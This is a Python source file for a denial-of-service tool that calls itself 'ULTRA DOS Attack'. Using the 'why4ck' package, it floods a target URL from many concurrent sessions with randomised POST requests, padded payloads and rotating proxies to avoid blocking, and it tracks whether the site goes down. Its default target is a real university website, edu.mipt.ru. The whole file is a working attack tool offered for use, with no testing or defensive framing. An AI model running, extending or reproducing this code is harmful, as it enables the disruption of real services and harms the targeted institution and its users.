import asyncio
import time
import os
from colorama import init, Fore, Style
from why4ck import multi_optimized

# Initialize colorama for Windows
init(autoreset=True)


def print_info(msg: str, color: str = Fore.GREEN):
    """Print colored message."""
    print(f"{color}{msg}{Style.RESET_ALL}")


def print_header(title: str):
    """Print header."""
    print(f"\n{Fore.CYAN}{'=' * 60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{title:^60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'=' * 60}{Style.RESET_ALL}\n")


async def run_single_optimized_session(url: str, session_id: int, concurrency: int, 
                                        is_inf: bool, requests_limit: int, stop_event: asyncio.Event,
                                        proxies: list = None, payload_size_kb: int = 1,
                                        global_stats: dict = None, global_lock: asyncio.Lock = None) -> dict:
    """Run a single optimized session and return its stats."""
    
    # Use provided global stats if in ultra mode, otherwise create own
    if global_stats is not None:
        shared_stats = global_stats
        lock = global_lock if global_lock else asyncio.Lock()
    else:
        shared_stats = {
            'total': 0,
            'errors': 0,
            'batches': 0,
            'sessions_done': 0,
            'sessions_started': 0,
            'consecutive_timeouts': 0,
            'last_rps': 0,
            'site_down': False,
            'site_down_msg_printed': False,
            'bytes_received': 0,
            'start_time': time.time(),
            'shutdown': False,
            'last_batch_weight': 0,
        }
        lock = asyncio.Lock()
    
    session = multi_optimized.OptimizedSession(
        session_id=session_id,
        url=url,
        concurrency=concurrency,
        is_inf=is_inf,
        use_post=True,  # Enable POST for payload
        use_random_headers=True,
        use_random_params=True,
        stats=shared_stats,
        lock=lock,
        proxies=proxies,
        payload_size_kb=payload_size_kb
    )
    
    try:
        await session.run(requests_limit, stop_event)
    except Exception as e:
        print(f"{Fore.RED}Session {session_id} error: {e}{Style.RESET_ALL}")
    
    elapsed = time.time() - shared_stats['start_time']
    bytes_received = shared_stats.get('bytes_received', 0)
    mbps = (bytes_received * 8) / (elapsed * 1_000_000) if elapsed > 0 else 0
    rps = shared_stats['total'] / elapsed if elapsed > 0 else 0
    avg_weight = bytes_received // shared_stats['total'] if shared_stats['total'] > 0 else 0
    
    return {
        'session_id': session_id,
        'total': shared_stats['total'],
        'errors': shared_stats['errors'],
        'bytes_received': bytes_received,
        'avg_weight': avg_weight,
        'elapsed': elapsed,
        'rps': rps,
        'mbps': mbps,
        'site_down': shared_stats.get('site_down', False)
    }


async def ultra_main(
    url: str,
    sessions: int = 10,
    concurrency: int = 200,
    is_inf: bool = True,
    show_header: bool = True,
    proxy_file: str = "why4ck/proxy.txt",
    payload_size_kb: int = 1
):
    """Run ultra mode with optimized performance and proxy support."""
    
    # Load proxies
    proxies = multi_optimized.load_proxies(proxy_file)
    
    if show_header:
        print_header("ULTRA DOS Attack - OPTIMIZED Multi-Multi Session")
    
    print_info(f"Target: {url}", Fore.BLUE)
    print_info(f"Ultra Sessions: {sessions}")
    print_info(f"Concurrency per session: {concurrency}")
    print_info(f"Total potential concurrency: {sessions * concurrency}")
    print_info(f"Payload size: {payload_size_kb} KB", Fore.YELLOW)
    print_info(f"Extra headers: {multi_optimized.EXTRA_HEADERS_MIN}-{multi_optimized.EXTRA_HEADERS_MAX} per request", Fore.YELLOW)
    print_info(f"Proxies: {len(proxies)} loaded", Fore.CYAN if proxies else Fore.YELLOW)
    print_info(f"Mode: {'INFINITE' if is_inf else 'LIMITED'}", Fore.YELLOW)
    print_info(f"Optimization: Pre-generated headers + payload, DNS cache, Keep-alive", Fore.CYAN)
    print_info("Press Ctrl+C to stop\n", Fore.YELLOW)
    
    global_stats = {
        'total': 0,
        'errors': 0,
        'bytes_received': 0,
        'start_time': time.time(),
        'shutdown': False,
        '_is_multi_session': True,
        '_active_sessions': sessions,
        'last_batch_weight': 0,
        'batches': 0,
        'sessions_done': 0,
        'sessions_started': 0,
        'consecutive_timeouts': 0,
        'last_rps': 0,
        'site_down': False,
        'site_down_msg_printed': False,
        'server_errors': 0,
        'server_error_msg_printed': False,
    }
    global_lock = asyncio.Lock()
    stop_event = asyncio.Event()
    
    all_session_stats = []
    start_time = time.time()
    
    async def run_session_safe(session_num):
        try:
            return await run_single_optimized_session(
                url, session_num, concurrency, is_inf, 
                0 if is_inf else 100000, stop_event, proxies, payload_size_kb, global_stats, global_lock
            )
        except Exception as e:
            print(f"{Fore.RED}Session {session_num} error: {e}{Style.RESET_ALL}")
            return None
    
    tasks = [run_session_safe(i + 1) for i in range(sessions)]
    
    print(f"{Fore.CYAN}Starting {sessions} ultra sessions...{Style.RESET_ALL}\n")
    
    # Print global stats in a separate task
    async def print_global_stats():
        last_total = 0
        while not stop_event.is_set():
            await asyncio.sleep(0.5)
            if global_stats['total'] > last_total:
                total = global_stats['total']
                errors = global_stats['errors']
                elapsed = time.time() - global_stats['start_time']
                rps = total / elapsed if elapsed > 0 else 0
                
                bytes_received = global_stats['bytes_received']
                mbps = (bytes_received * 8) / (elapsed * 1_000_000) if elapsed > 0 else 0
                
                last_weight = global_stats.get('last_batch_weight', 0)
                
                print(
                    f"{Fore.RED}{total}{Style.RESET_ALL} requests | "
                    f"{Fore.BLUE}{rps:.1f}{Style.RESET_ALL} req/s | "
                    f"{Fore.CYAN}{last_weight}{Style.RESET_ALL} bytes | "
                    f"{Fore.GREEN}{mbps:.1f}{Style.RESET_ALL} Mbps | "
                    f"{Fore.MAGENTA}Errors: {errors}{Style.RESET_ALL} | "
                    f"{Fore.YELLOW}Sessions: {sessions}{Style.RESET_ALL}"
                )
                last_total = total
    
    # Start stats printer
    stats_task = asyncio.create_task(print_global_stats())
    
    try:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, dict):
                all_session_stats.append(result)
            elif result is not None and not isinstance(result, Exception):
                all_session_stats.append(result)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Stopping ultra attack...{Style.RESET_ALL}")
        stop_event.set()
        stats_task.cancel()
        try:
            await stats_task
        except asyncio.CancelledError:
            pass
        await asyncio.sleep(0.5)
    finally:
        stop_event.set()
        stats_task.cancel()
        try:
            await stats_task
        except asyncio.CancelledError:
            pass
    
    total_requests = sum(s['total'] for s in all_session_stats)
    total_errors = sum(s['errors'] for s in all_session_stats)
    total_bytes = sum(s['bytes_received'] for s in all_session_stats)
    elapsed = time.time() - start_time
    sessions_completed = len(all_session_stats)
    site_down_count = sum(1 for s in all_session_stats if s.get('site_down', False))
    
    avg_rps = total_requests / elapsed if elapsed > 0 else 0
    mbps = (total_bytes * 8) / (elapsed * 1_000_000) if elapsed > 0 else 0
    total_mb = total_bytes / (1024 * 1024) if total_bytes > 0 else 0
    avg_weight = total_bytes // total_requests if total_requests > 0 else 0
    
    print("\n")
    print_header("=== ULTRA ATTACK SUMMARY ===")
    print_info(f"Ultra Sessions Completed: {sessions_completed}/{sessions}", Fore.CYAN)
    print_info(f"Total Requests: {total_requests:,}", Fore.RED)
    print_info(f"Errors: {total_errors:,}", Fore.YELLOW)
    print_info(f"Success Rate: {((total_requests - total_errors) / total_requests * 100) if total_requests > 0 else 0:.1f}%", Fore.GREEN)
    print_info(f"Average Request Weight: {avg_weight} bytes (~{avg_weight/1024:.1f} KB)", Fore.CYAN)
    print_info(f"Total Traffic: {total_mb:.2f} MB", Fore.YELLOW)
    print_info(f"Average Speed: {mbps:.2f} Mbit/s", Fore.GREEN)
    print_info(f"Average RPS: {avg_rps:.1f} req/s", Fore.BLUE)
    print_info(f"Total Time: {elapsed:.1f}s", Fore.CYAN)
    
    if site_down_count > 0:
        print_info(f"Sessions Reporting Site DOWN: {site_down_count}", Fore.RED)
    
    print(f"\n{Fore.CYAN}{'=' * 60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'Session Results':^60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'=' * 60}{Style.RESET_ALL}\n")
    
    for stats in all_session_stats:
        weight = stats.get('avg_weight', 0)
        print(
            f"{Fore.YELLOW}Session {stats['session_id']}:{Style.RESET_ALL} "
            f"{Fore.RED}{stats['total']:,}{Style.RESET_ALL} requests | "
            f"{Fore.BLUE}{stats['rps']:.1f}{Style.RESET_ALL} req/s | "
            f"{Fore.CYAN}{weight}{Style.RESET_ALL} bytes | "
            f"{Fore.GREEN}{stats['mbps']:.1f}{Style.RESET_ALL} Mbps | "
            f"{Fore.MAGENTA}Errors: {stats['errors']:,}{Style.RESET_ALL}"
        )
    
    return {
        'total': total_requests,
        'errors': total_errors,
        'bytes': total_bytes,
        'elapsed': elapsed,
        'sessions': sessions_completed,
        'mbps': mbps,
        'avg_rps': avg_rps,
        'avg_weight': avg_weight,
        'site_down': site_down_count > 0
    }


async def main(
    sessions: int = 10,
    url: str = "https://edu.mipt.ru/",
    concurrency: int = 200,
    is_inf: bool = True,
    proxy_file: str = "why4ck/proxy.txt"
):
    """Entry point for ultra mode."""
    try:
        await ultra_main(
            url=url,
            sessions=sessions,
            concurrency=concurrency,
            is_inf=is_inf,
            proxy_file=proxy_file
        )
    except KeyboardInterrupt:
        print_info("\nInterrupted by user", Fore.YELLOW)


def use(sessions: int, url: str, concurrency: int = 200, is_inf: bool = True):
    """Function for compatibility with CLI - synchronous wrapper."""
    import asyncio
    asyncio.run(main(sessions=sessions, url=url, concurrency=concurrency, is_inf=is_inf))
